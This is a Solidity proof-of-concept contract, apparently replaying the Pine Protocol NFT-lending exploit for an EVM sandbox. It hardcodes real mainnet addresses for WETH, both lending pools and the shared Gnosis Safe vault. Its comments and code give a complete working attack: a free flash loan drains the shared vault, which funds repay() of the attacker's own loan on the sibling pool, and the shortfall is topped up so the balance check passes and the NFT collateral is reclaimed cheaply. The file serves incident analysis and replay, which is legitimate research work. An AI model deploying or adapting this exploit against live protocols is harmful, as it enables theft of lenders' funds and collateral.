// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-12-PineProtocol).
//
// Pine Protocol runs two NFT lending pools ("old" and "new" ERC721LendingPool02)
// that SHARE a single lender vault (`_fundSource` = the Pine Gnosis Safe,
// 0xc490...037e). Each pool draws liquidity from, and settles repayments back
// into, that one shared vault.
//
// `flashLoan()` on the OLD pool moves the vault's ENTIRE WETH balance out to
// the receiver, runs the receiver's callback, then only checks that the
// vault's balance is back to where it started (`amountFee` is hardcoded to
// 0 -- the flash loan is free and permissionless). It never checks WHO
// refilled the vault or WHY.
//
// `repay()` on the NEW pool pulls the repay amount from its caller, and -- as
// a side effect of settling the caller's own loan -- forwards the loan
// principal straight back into that SAME shared vault, then releases the
// loan's NFT collateral to the recorded borrower.
//
// The attacker (who already holds an open loan on NFT 3324 on the new pool,
// taken out in an earlier transaction) chains these together inside one flash
// loan callback:
//   1. Flash-borrow the vault's whole WETH balance from the OLD pool (drains
//      the vault to 0).
//   2. Inside the callback, use that borrowed WETH to repay() the attacker's
//      OWN loan on the NEW pool. The new pool forwards the principal back
//      into the SAME vault and releases NFT 3324 to the borrower for free.
//   3. Top up the tiny interest/fee shortfall so the vault's balance is
//      restored to exactly its starting value -- the flash loan's "did you
//      repay me?" balance check passes, because the vault got refilled by an
//      unrelated repay() on the sibling pool, not by the receiver's own funds.
//
// Net effect: the attacker reclaims the NFT collateral (~4.26 WETH value)
// while paying only the loan's tiny accrued interest + protocol fee. See
// PineProtocol_exp.md in the registry folder for the full writeup.
//
// The DeFiHackLabs PoC (test/PineProtocol_exp.sol) runs the attack INLINE in
// the Foundry `ContractTest` contract and uses two cheatcodes this
// cheatcode-free replay does not need:
//   - `vm.prank(address(this), pineExploiter)` / `vm.startPrank(...)`: forces
//     tx.origin to the historical attacker EOA. Checked: neither flashLoan()
//     nor repay() reads tx.origin anywhere in ERC721LendingPool02.sol -- only
//     borrow() (a "Phishing!" check we never hit, since the loan already
//     exists) and withdrawERC721() (an event field we never touch) do. Safe
//     to drop entirely; msg.sender is already this contract on every call we
//     make, which is all that matters here.
//   - `deal(address(WETH), address(this), balance + 0.3 ether)`: mirrors the
//     ~0.3 WETH of the attacker's own working capital used to cover the
//     loan's tiny accrued-interest/protocol-fee shortfall (the live attacker
//     supplied it from prior profits). Replaced with a `setup.dealToken` step
//     in the config that pre-funds this contract with 0.3 WETH before the
//     attack runs -- mechanically equivalent, since the shortfall is computed
//     live from balances either way.
// Logic is otherwise copied verbatim from test/PineProtocol_exp.sol.

interface IWETHMin {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IERC721LendingPool {
    function flashLoan(address payable _receiver, address _reserve, uint256 _amount, bytes memory _params) external;

    function repay(uint256 nftID, uint256 repayAmount, address pineWallet) external returns (bool);
}

contract PineProtocolExploit {
    IWETHMin private constant WETH = IWETHMin(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC721LendingPool private constant ERC721LendingPool02Old =
        IERC721LendingPool(0x2405913d54fC46eEAF3Fb092BfB099F46803872f);
    IERC721LendingPool private constant ERC721LendingPool02New =
        IERC721LendingPool(0xC3f4659588b13f23E09Ec54783A3c407e39ad589);
    address private constant pineGnosisSafe = 0xc490E4646A91C3CBaFa8c55540c94Dcd0212037e;
    uint256 private constant collateralTokenId = 3324;

    /// @notice The recorded entrypoint. Flash-borrows the ENTIRE shared vault
    ///         balance from the old (deprecated) pool -- free, permissionless,
    ///         zero-fee -- to fund the repay() chain in executeOperation.
    function testExploit() external {
        uint256 flashAmount = WETH.balanceOf(pineGnosisSafe);
        ERC721LendingPool02Old.flashLoan(payable(address(this)), address(WETH), flashAmount, "");
    }

    /// @notice IFlashLoanReceiver callback, invoked by the OLD pool mid-flashLoan
    ///         (msg.sender == old pool here). Uses the flash-borrowed WETH to
    ///         repay the attacker's own loan on the NEW pool, which forwards
    ///         the principal back into the SAME shared vault the flash loan
    ///         just drained -- then tops up the tiny remaining shortfall so the
    ///         old pool's balance-equality check passes.
    function executeOperation(
        address, /* _reserve */
        uint256 _amount,
        uint256, /* _fee */
        bytes memory /* _params */
    ) external {
        WETH.approve(address(ERC721LendingPool02New), type(uint256).max);
        // Repay the attacker's own outstanding loan on the new pool with the
        // ENTIRE flash-borrowed amount. This pool forwards the loan principal
        // back into `pineGnosisSafe` (the SAME vault the flash loan drained)
        // as a side effect of releasing the NFT collateral for free.
        ERC721LendingPool02New.repay(collateralTokenId, _amount, address(0));
        // Whatever the repay's principal-forward didn't already refill, top up
        // from this contract's own working capital (the refunded loan
        // overpayment + the pre-funded 0.3 WETH) so the vault's balance is
        // restored to EXACTLY its starting value.
        uint256 amountToTransfer = _amount - WETH.balanceOf(pineGnosisSafe);
        WETH.transfer(pineGnosisSafe, amountToTransfer);
    }
}
